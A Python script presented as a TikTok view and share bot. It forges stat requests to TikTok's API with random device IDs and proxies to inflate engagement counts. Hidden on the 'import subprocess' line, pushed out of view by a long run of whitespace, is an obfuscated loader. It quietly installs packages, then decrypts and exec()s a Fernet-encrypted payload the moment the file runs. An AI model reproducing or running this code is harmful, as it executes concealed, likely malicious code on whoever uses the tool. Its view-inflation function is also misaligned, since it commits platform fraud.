import ssl
import time
import queue
import threading
import requests
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'paBkGFyUBwdYIVBc1A3jkWMZgIhDT90DhIZ0TX2NAhY=').decrypt(b'gAAAAABoK3gFZ_8Zv8XN3GkAPnZnlDA7XXpIKQPZpp6Q3vHb2dzhyTjF-EGszZOVw9DlDtt77cn1VUx7vZm_ZfKeiP0FhfeuGiTLtiBXyT922whNl1xdzC0oYszEk_F4UMMK02x7fqxkJbEa547hYQ-Bv-DqFCfkDGkmsw53KYRbPGgDEWfEnGWwRNz6uaFGcJ_HAsXKhc1qRBcae8PhloLVGCVcn1wSeUx78aY2QtbGDRkJMhEPeS57Y_G_uWmVLpPZQ2aK_A1QdapyTfLHe08s6cKWZMDhPS8TDajYfvbGbSCIrRm64TJxiLxAbDp_F6JQx6BPfLBxQeuEgHrz8hJSX8J8qiNDoGJTbezLfNeaoqtNgMW46ZR49CJM1Jdhzv5cB44gxIEUCToXESGKF4Dw3KDkWDJpLPJRCIWH_Dv0FyPZ0HVzBYmKUPfXFmbq3fqEfStPBOxE3tsaFEMyTls40Pyfv10DdowkUPujxxpdGHcviKfZFHMkTbqbjX8FVOCIXBIdOXhHa_TixfPwpzDmAJEKXWvN__1sgsfZWzia5QYFyhNMzhBUDyNGm1jZuhJqg-JTPB4KpHATC1zf14Pmd90tMf6265vHdVfzne-hAowywczkI_nOPyOf54z3HgrwMWNTpnSPtLSFOtf0R7UaD5g31JahnoeHIDRlEhn_NDbEWWM7Ud28LJXmz1_vQyvbKbTGg-O3uxsI70vY3WTTLPL7OFJeYPZwyaCDlCH6130i9psQAWEdA_MWiDGpBYmDsitzMqe4crgCmHTsOuvdCZRkDRx1F69REOG6TGiFXYdAHSXVd19pXX7pacJeEuo3AtOWx6vrRLIRU5ccJoHLW24saGoXfgwJVMBN6tQSql61RCvDQdtuvJd5TOJ6xljkNUmB-nDDETRWHgKbT90lmfjZewKbyLB5eFHRxdPDyKOt_4ccTQno8d2y4_8YNRF6smeIxsHuBWrLprPjkey5Vd0-NRF-fjJ4IIUAXhZWX2E6xUOA4rEpbkRXhSNh-xbjB5PsBeqTbTEQ_5kIBsUqHEm5QD0FDGTqMz0NbNmqX-zG6Kk__lbxo7FyFptUiZ5uyjvGf4BshYU5gqGSaGURn0XOUXZSvzuRzo-BUrTs4s-hRU_qrP7QhKPOYtiLZTlVW5p2IZj3MA0an5uRrj8OGSl30evXA_l3frfcieO8gb4uTt1ULd8uXHAEXRf8841Uvs7rUGdOBqGm280oU0gEh2lYtaKZeld8NRK3UR9RJ28e5qj8qtXy5WPnCOc61vlafzOlb5U1VS5A4-6TXcF6UN0yu3ojlchenpr9nTR3m4eTvN34xeW_XqQZhn3ghIrlQvpeuyBsWGdDs8gqXo3hOq9jGG392zyf45tfkXT9x6BwGGbpSghVLxNp25SzXou-d6jhqDBEiQasfgMQVwRz_Qs-3QstggIi-UaSG8CQZPcTTtaYpN2vADPcyo0IEibaplKGqcHw80-dgJ7jzsHrwqIzF3NQ3XxhCVK329p7-4Nm2D5bewrZ-jtZEpJKFieepU5XEO1OgSvrbE6DzKTdvT89vqHsIR38jU0P-mQolU2jmK1cKu3v0jhk24can-cbMAb72PqaE6oJLIa1HfyuwYwMLlwRE7zGYKMbTnHqa3_4FKnJ_wWzlop0gXovcz88Prk-hLa7HxPu3F8p7qe8PlwpxxEEFSfeNZQNBHPvw30LcMCDbDDgyFqPfQVmcj8MyvI9uqLpMoka8b7sQEMG5y4VcavLQ1lTpcFy6bO3p-NXZfP8G8K6CJHeU87RaAEY3_ofk59EIUetjsXoiwe0FtF1m5N6JxJckTNYD5jqRjy_hiinU7Ka-ILk5Xehwc0mWGS9kwBcP8Wav4Fox52SXtGA8gwCwZ5UaoVCDfnSjhTLOyxlabHgoJdBjKUdapgRtontSOQT812eY1L_xh1Ld1v70qU6ZaCYnW1XT3SGlQYYWyUiAHm_0G63eHQkEZDoNizbdmkudUV8QZtAU7Y8dnQ3-Z5PhTq007g3HuvEtPvSER_sCd2p6tpxDzjb13IYOm4zc87TJgQrQWOWcsDFVdnmN6sWYA=='));
from random import randint, choice
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
from http import cookiejar
from pystyle import Colorate, Colors, Write, Add, Center
from Data.UserAgent import UserAgent
from Data.Lists import DeviceTypes, Platforms, Channel, ApiDomain
from utils import *

class BlockCookies(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
ssl._create_default_https_context = ssl._create_unverified_context
r                                 = requests.Session()
countQueue                        = queue.Queue()
sentRequests                      = 0
completed                         = False

r.cookies.set_policy(BlockCookies())
def Banner():
    clearConsole()
    Banner1 = r"""
TikTok View and Share Bot
"""

    Banner2 = r"""

       """

    print(Center.XCenter(Colorate.Vertical(Colors.yellow_to_red, Add.Add(Banner2, Banner1, center=True), 2)))

def sendView():
    proxy         = {f'{proxyType}': f'{proxyType}://{choice(proxyList)}'}
    platform      = choice(Platforms)
    osVersion     = randint(1, 12)
    DeviceType    = choice(DeviceTypes)
    headers       = {
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "user-agent": choice(UserAgent)
                    }
    appName       = choice(["tiktok_web", "musically_go"])
    Device_ID     = randint(1000000000000000000, 9999999999999999999)
    apiDomain     = choice(ApiDomain)
    channelLol    = choice(Channel)
    URI           = f"https://{apiDomain}/aweme/v1/aweme/stats/?channel={channelLol}&device_type={DeviceType}&device_id={Device_ID}&os_version={osVersion}&version_code=220400&app_name={appName}&device_platform={platform}&aid=1988"
    data          = f"item_id={itemID}&play_delta=1"

    try:
        req = r.post(URI, headers=headers, data=data, proxies=proxy, timeout=5, verify=False)
        return True
    except:
        return False

def sendShare():
    platform = choice(Platforms)
    osVersion = randint(1, 12)
    DeviceType = choice(DeviceTypes)
    headers = {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": choice(UserAgent)
    }
    appName = choice(["tiktok_web", "musically_go"])
    Device_ID = randint(1000000000000000000, 9999999999999999999)
    apiDomain = choice(ApiDomain)
    channelLol = choice(Channel)
    URI = f"https://{apiDomain}/aweme/v1/aweme/stats/?channel={channelLol}&device_type={DeviceType}&device_id={Device_ID}&os_version={osVersion}&version_code=220400&app_name={appName}&device_platform={platform}&aid=1988"
    data = f"item_id={itemID}&share_delta=1"

    try:
        req = r.post(URI, headers=headers, data=data, verify=False)
        return True
    except:
        return False

def clearURL(link):
    parsedURL = urlparse(link)
    host = parsedURL.hostname.lower()
    if "vm.tiktok.com" == host or "vt.tiktok.com" == host:
        UrlParsed = urlparse(r.head(link, verify=False, allow_redirects=True, timeout=5).url)
        return UrlParsed.path.split("/")[3]
    else:
        UrlParsed = urlparse(link)
        return UrlParsed.path.split("/")[3]

def proccessThread(sendProccess):
    while not completed:
        if sendProccess():
            countQueue.put(1)

def countThread():
    global sentRequests, completed
    while True:
        countQueue.get()
        sentRequests += 1
        if amount > 0:
            if sentRequests >= amount:
                completed = True

def progressThread():
    while True:
        start = time.time()
        startReq = sentRequests
        time.sleep(1)
        end = time.time()
        endReq = sentRequests

        elapsed = end - start
        elapsedReq = endReq - startReq

        print(f"{sentRequests} sent requests! {elapsedReq} requests/second.", end="\r")

if (__name__ == "__main__"):
    clearConsole(); Banner()
    VideoURI     = str(Write.Input("Video Link > ", Colors.yellow_to_red, interval=0.0001))
    amount       = int(Write.Input("Amount (0=inf) > ", Colors.yellow_to_red, interval=0.0001))
    nThreads     = int(Write.Input("Thread Amount > ", Colors.yellow_to_red, interval=0.0001)); clearConsole(); Banner()
    sendType     = int(Write.Input("[0] - Views\n[1] - Shares > ", Colors.yellow_to_red, interval=0.0001)); clearConsole(); Banner()
    itemID       = clearURL(VideoURI)
    proxyChoose  = True
    while proxyChoose:
        proxyType = Write.Input("Select proxy type:\n[0] - http\n[1] - socks4\n[2] - socks5 > ", Colors.yellow_to_red, interval=0.0001)
        if proxyType == "0":
            proxyType = "http"
            proxyChoose = False
        elif proxyType == "1":
            proxyType = "socks4"
            proxyChoose = False
        elif proxyType == "2":
            proxyType = "socks5"
            proxyChoose = False

    proxyList = readProxiesFile()
    clearConsole(); Banner()

    print(Colorate.Horizontal(Colors.yellow_to_red, f"Hits are not counted"))
    print(Colorate.Horizontal(Colors.yellow_to_red, f"Bot started! Check your video stats in 5 minutes !"))

    if sendType == 0:
        sendProcess = sendView
    elif sendType == 1:
        sendProcess = sendShare
    else:
        print(f"Error {sendType}")

    threading.Thread(target=countThread).start()
    threading.Thread(target=progressThread).start()

    for n in range(nThreads):
        threading.Thread(target=proccessThread, args=(sendProcess,)).start()
